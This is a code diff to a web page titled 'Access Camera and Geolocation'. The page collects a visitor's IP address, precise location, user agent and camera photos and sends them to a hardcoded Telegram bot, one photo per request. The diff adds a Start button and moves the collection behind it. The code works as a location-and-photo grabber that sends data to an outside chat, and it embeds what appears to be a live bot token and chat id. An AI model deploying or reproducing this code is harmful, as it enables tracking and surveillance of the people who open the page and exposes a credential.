@@ -30,6 +30,7 @@
 </head>
 <body>
     <h1>Access Camera and Geolocation</h1>
+    <button id="startButton">Start</button>
     <p id="location"></p>
     <input type="file" accept="image/*" capture="environment" id="camera" multiple>
     <div id="preview"></div>
@@ -43,33 +44,33 @@
         const telegramBotToken = '7359419952:AAHFAG4df44WHFOS3SJ6mafXxMtW9v-fc8E';
         const chatId = '2036883627';
 
-        // Fetch IP Address
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                ipAddress = data.ip;
-            })
-            .catch(error => {
-                console.error('Error fetching IP address:', error);
-            });
+        document.getElementById('startButton').addEventListener('click', () => {
+            // Fetch IP Address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip;
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
 
-        // Request Geolocation and Camera Access on Page Load
-        window.onload = () => {
+            // Request Geolocation
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((position) => {
                     latitude = position.coords.latitude;
                     longitude = position.coords.longitude;
                     document.getElementById('location').innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
+
+                    // Trigger the camera input
+                    document.getElementById('camera').click();
                 }, (error) => {
                     alert(`Error getting location: ${error.message}`);
                 });
             } else {
                 alert('Geolocation is not supported by this browser.');
             }
-
-            // Trigger the camera input
-            document.getElementById('camera').click();
-        };
+        });
 
         document.getElementById('camera').addEventListener('change', (event) => {
             const files = event.target.files;
@@ -91,33 +92,31 @@
 
         const sendDataToTelegramBot = () => {
             if (latitude && longitude && photos.length > 0) {
-                const formData = new FormData();
-                formData.append('latitude', latitude);
-                formData.append('longitude', longitude);
-                formData.append('ip', ipAddress);
-                formData.append('userAgent', userAgent);
-
                 photos.forEach((photo, index) => {
-                    formData.append(`photo${index + 1}`, photo);
-                });
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('latitude', latitude);
+                    formData.append('longitude', longitude);
+                    formData.append('ip', ipAddress);
+                    formData.append('userAgent', userAgent);
+                    formData.append('photo', photo);
 
-                formData.append('chat_id', chatId);
-
-                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        alert('Data sent successfully');
-                    } else {
-                        alert('Failed to send data: ' + data.description);
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert('Failed to send data');
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            alert(`Photo ${index + 1} sent successfully`);
+                        } else {
+                            alert(`Failed to send photo ${index + 1}: ${data.description}`);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        alert('Failed to send data');
+                    });
                 });
             } else {
                 alert('Please capture location and photos first.');
